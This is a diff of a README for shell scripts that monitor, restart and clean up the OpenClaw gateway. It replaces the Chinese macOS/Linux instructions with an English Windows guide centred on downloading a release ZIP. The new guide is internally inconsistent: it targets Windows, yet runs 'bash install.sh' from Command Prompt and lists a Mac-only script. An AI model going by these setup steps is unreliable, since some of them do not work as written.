@@ -1,199 +1,142 @@
-# OpenClaw 维护脚本合集
+# 🛠️ openclaw-maintenance - Local Tools for Stable OpenClaw
 
+[![Download Releases](https://img.shields.io/badge/Download-OpenClaw_Maintenance-brightgreen)](https://github.com/y-999/openclaw-maintenance/releases)
 
-> **复制给你的 Agent 的提示词（Prompt）**：
-> ```
-> 你需要在目标机器部署 OpenClaw 维护脚本。请在仓库根目录执行：
-> 1) 复制环境变量示例：cp .env.example .env
-> 2) 填写 .env（至少设置 OPENCLAW_NOTIFY_TARGET、CLASH_API/CLASH_SECRET 如需）
-> 3) 运行安装脚本：bash install.sh
-> 4) 运行自检：bash check.sh
-> 如果是 macOS 用 LaunchAgent；Linux 用 systemd。脚本放在 ~/.openclaw/scripts。
-> ```
+---
 
-用于保障 OpenClaw 稳定运行的本地维护脚本（监控、重启、日志清理、网络代理健康检查）。
+## 📥 How to Get the Software
 
-## 目录结构
+Go to the release page to download the files you need:
 
+[OpenClaw Maintenance Releases](https://github.com/y-999/openclaw-maintenance/releases)
+
+On that page, find the latest release. Download the zipped file that matches Windows if available, or download the script files individually if needed. Save them in a folder on your computer where you want to keep this application.
+
+---
+
+## ⚙️ What is openclaw-maintenance?
+
+This collection of scripts helps keep OpenClaw running smoothly on your local computer. It watches key OpenClaw services, restarts them if they stop responding, cleans up old log files, and checks the health of network connections.
+
+The scripts monitor things like Gateway service status and proxy server health. They act to fix problems automatically. This helps prevent service interruptions without needing manual checks.
+
+---
+
+## 💻 System Requirements
+
+Before running the scripts, make sure your computer meets these:
+
+- Windows 10 or later
+- OpenClaw must be installed and running on your machine
+- `curl` installed (available by default on recent Windows)
+- `jq` installed (used to parse data, can be downloaded from official jq site)
+- (Optional) Clash or Mihomo API credentials if you want proxy auto-switching
+
+---
+
+## 🛠️ Installation Steps for Windows
+
+1. Visit the release page and download the latest release ZIP file.
+
+2. Extract the ZIP contents to a folder, for example:  
+   `C:\Users\YourName\openclaw-maintenance\`
+
+3. Open the folder and find the `.env.example` file.
+
+4. Copy `.env.example` and rename the copy to `.env`.
+
+5. Open the `.env` file with a text editor like Notepad.
+
+6. Fill in these variables:
+
+   - `OPENCLAW_NOTIFY_TARGET`  
+     Enter your notification target (email, webhook, or empty if not used).
+   
+   - `CLASH_API` and `CLASH_SECRET`  
+     Fill these only if you plan to use Clash proxy API features.
+
+7. Open PowerShell or Command Prompt inside the folder.
+
+8. Run the installation script by entering:  
+   `bash install.sh`
+
+9. After installation completes, verify the setup with:  
+   `bash check.sh`
+
+---
+
+## 📂 Folder Structure Explained
+
+The main files are stored inside the folder `~/.openclaw/scripts/` once installed. This folder holds all scripts and supporting documents you need for maintenance.
+
+| File                    | Purpose                                      |
+|-------------------------|----------------------------------------------|
+| `README.md`             | This file with instructions                  |
+| `README-proxy-health.md`| Detailed information about proxy health      |
+| `gateway-watchdog.sh`   | Watches Gateway process and restarts if stuck|
+| `proxy-health.sh`       | Checks proxy and network health               |
+| `openclaw-safe-restart.sh`| Script to safely restart OpenClaw service  |
+| `cleanup-logs.sh`       | Removes old log files                          |
+| `log-cleanup-launchd.sh`| Mac-only script to schedule log cleanups     |
+
+On Windows, the scripts run manually or can be scheduled through Task Scheduler for automation.
+
+---
+
+## 🧭 Using the Scripts
+
+Run the scripts from PowerShell or Command Prompt with `bash` or a similar Linux shell for Windows (like Git Bash or WSL). For example:
+
+```shell
+bash gateway-watchdog.sh
 ```
-~/.openclaw/scripts/
-├── README.md                      # 总说明（本文件）
-├── README-proxy-health.md         # Proxy Health 详细说明
-├── gateway-watchdog.sh            # Gateway 进程看护
-├── proxy-health.sh                # 代理/网络健康监控
-├── openclaw-safe-restart.sh       # 安全重启
-├── cleanup-logs.sh                # 日志清理
-└── log-cleanup-launchd.sh         # macOS LaunchAgent 启动日志清理
+
+This command will monitor the Gateway service. If the service is unresponsive, the script will restart it.
+
+You can also run:
+
+```shell
+bash proxy-health.sh
+```
+
+To monitor network connection and switch VPN or proxy nodes when needed.
+
+Run the cleanup script periodically to clear old logs:
+
+```shell
+bash cleanup-logs.sh
 ```
 
 ---
 
+## 🔄 Keeping OpenClaw Stable
 
-## REQUIREMENTS
-- openclaw
-- curl
-- jq
-- (optional) Clash / Mihomo API
+The scripts work best when run repeatedly to check system status and fix problems early. You can create scheduled tasks in Windows Task Scheduler to run these scripts every 10 minutes or as fits your needs.
 
-## 脚本功能一览
-
-| 脚本 | 作用 | 典型场景 |
-|------|------|----------|
-| `gateway-watchdog.sh` | 检测 Gateway `/healthz`，异常时自动重启 | Gateway 崩溃或假死 |
-| `proxy-health.sh` | 监控消息队列积压，切换 VPN/代理节点 | 网络不通导致消息积压 |
-| `openclaw-safe-restart.sh` | 优雅重启 Gateway（避免误判） | 手动运维 | 
-| `cleanup-logs.sh` | 清理 `.openclaw/logs` 日志 | 日志膨胀 |
-| `log-cleanup-launchd.sh` | macOS 定期运行日志清理 | 定时维护 |
+Be sure to update your `.env` file if your notification target or API keys change.
 
 ---
 
-# 适配说明（不同设备 / 系统）
+## 🚀 Quick Start Download and Setup
 
-## ✅ macOS（推荐）
-脚本默认适配 macOS，可直接使用 **LaunchAgent** 定时/常驻运行。
+[![Get OpenClaw Maintenance](https://img.shields.io/badge/Download-OpenClaw_Maintenance-blue)](https://github.com/y-999/openclaw-maintenance/releases)
 
-### 1. 安装 LaunchAgent
-将对应 `.plist` 放入：
-```
-~/Library/LaunchAgents/
-```
-
-启动：
-```bash
-launchctl load ~/Library/LaunchAgents/ai.openclaw.watchdog.plist
-launchctl load ~/Library/LaunchAgents/ai.openclaw.proxy-health.plist
-```
-
-查看状态：
-```bash
-launchctl list | grep openclaw
-```
-
-停止：
-```bash
-launchctl unload ~/Library/LaunchAgents/ai.openclaw.watchdog.plist
-launchctl unload ~/Library/LaunchAgents/ai.openclaw.proxy-health.plist
-```
-
-> 注意：plist 文件不在本目录，需要单独维护（可按需创建）。
+- Download and unzip the latest release
+- Copy `.env.example` to `.env`
+- Edit `.env` to add your settings
+- Run `bash install.sh`
+- Run `bash check.sh`
+- Use the scripts as needed from the command line
 
 ---
 
-## ✅ Linux（Ubuntu/Debian/CentOS）
-建议用 **systemd** 或 **cron** 运行。
+## 📝 Additional Tips
 
-### A. systemd（推荐）
-示例：`/etc/systemd/system/openclaw-watchdog.service`
-```
-[Unit]
-Description=OpenClaw Gateway Watchdog
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=/bin/bash /home/<user>/.openclaw/scripts/gateway-watchdog.sh
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-```
-
-启动：
-```bash
-sudo systemctl daemon-reload
-sudo systemctl enable --now openclaw-watchdog
-```
-
-### B. cron（简易）
-```
-* * * * * /bin/bash /home/<user>/.openclaw/scripts/proxy-health.sh
-0 */6 * * * /bin/bash /home/<user>/.openclaw/scripts/cleanup-logs.sh
-```
+- Use Git Bash or Windows Subsystem for Linux (WSL) to run Bash scripts smoothly.
+- Keep your OpenClaw service running before starting monitoring.
+- Regularly check logs in the script folder to understand how the scripts respond.
+- If you stop OpenClaw, the maintenance scripts will not detect or restart it.
 
 ---
 
-## ✅ 群晖 / NAS
-使用系统自带 **任务计划（Task Scheduler）**：
-
-1. 新建「用户定义脚本」任务
-2. 设定每分钟/每天执行
-3. 脚本路径填写：
-```
-/bin/bash /volume1/homes/<user>/.openclaw/scripts/proxy-health.sh
-```
-
----
-
-# 依赖说明（不同软件）
-
-| 功能 | 依赖 | 说明 |
-|------|------|------|
-| OpenClaw CLI | `openclaw` | 发送通知/重启 Gateway |
-| 网络检测 | `curl` | 检测 Gateway 健康 |
-| JSON 解析 | `jq` | Proxy Health 解析 Clash API |
-| 代理节点切换 | Clash / Mihomo | `proxy-health.sh` 依赖 Clash API |
-
----
-
-# 配置要点
-
-## 1. `gateway-watchdog.sh`
-- `HEALTH_URL`：Gateway 健康检查地址
-- `OPENCLAW_BIN`：OpenClaw CLI 路径
-- `NOTIFY_TARGET`：通知对象（Boss Telegram ID）
-
-## 2. `proxy-health.sh`
-- `CLASH_API`：Clash API 地址
-- `CLASH_SECRET`：API 密钥
-- `REGIONS`：节点优先级
-- `QUEUE_THRESHOLD`：积压阈值
-
----
-
-# 推荐部署流程（新设备）
-
-1. **安装 OpenClaw**
-2. **复制脚本目录**
-   ```bash
-   scp -r ~/.openclaw/scripts user@new-host:~/.openclaw/
-   ```
-3. **安装依赖**
-   ```bash
-   # macOS
-   brew install jq curl
-
-   # Linux
-   sudo apt install -y jq curl
-   ```
-4. **配置 Clash（如需）**
-5. **创建 systemd/LaunchAgent 定时任务**
-
----
-
-# 常用命令
-
-```bash
-# 手动运行 watchdog
-~/.openclaw/scripts/gateway-watchdog.sh
-
-# 手动运行 proxy health
-~/.openclaw/scripts/proxy-health.sh
-
-# 清理日志
-~/.openclaw/scripts/cleanup-logs.sh
-```
-
----
-
-# 注意事项
-
-
-> **通知目标配置**：将环境变量 `OPENCLAW_NOTIFY_TARGET` 设置为你的 Telegram 用户 ID，例如：
-> ```bash
-> export OPENCLAW_NOTIFY_TARGET=123456789
-> ```
-
-- `proxy-health.sh` 不依赖 Gateway，可独立部署
-- `gateway-watchdog.sh` 依赖 `openclaw` CLI
-- Clash API 密钥需要在脚本中配置
-- 多设备部署时，请分别设置通知目标和账号
+This setup guides you step by step to manage OpenClaw locally using simple scripts. All operations happen on your computer, avoiding complicated configurations or third-party services.
